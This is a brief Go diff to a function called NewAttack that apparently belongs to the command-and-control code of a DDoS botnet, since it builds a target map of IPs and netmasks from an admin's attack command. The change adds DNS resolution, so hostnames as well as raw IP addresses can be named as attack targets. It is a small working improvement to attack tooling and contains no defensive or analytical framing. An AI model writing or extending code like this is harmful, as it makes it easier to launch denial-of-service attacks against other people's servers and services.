@@ -140,7 +140,15 @@ func NewAttack(str string, admin int, username string) (*Attack, error) {
 
 		ip := net.ParseIP(prefix)
 		if ip == nil {
-			return nil, ErrInvalidHost
+			// Try DNS resolution for hostnames
+			resolvedIPs, err := net.LookupHost(prefix)
+			if err != nil || len(resolvedIPs) == 0 {
+				return nil, ErrInvalidHost
+			}
+			ip = net.ParseIP(resolvedIPs[0])
+			if ip == nil {
+				return nil, ErrInvalidHost
+			}
 		}
 		atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
 	}
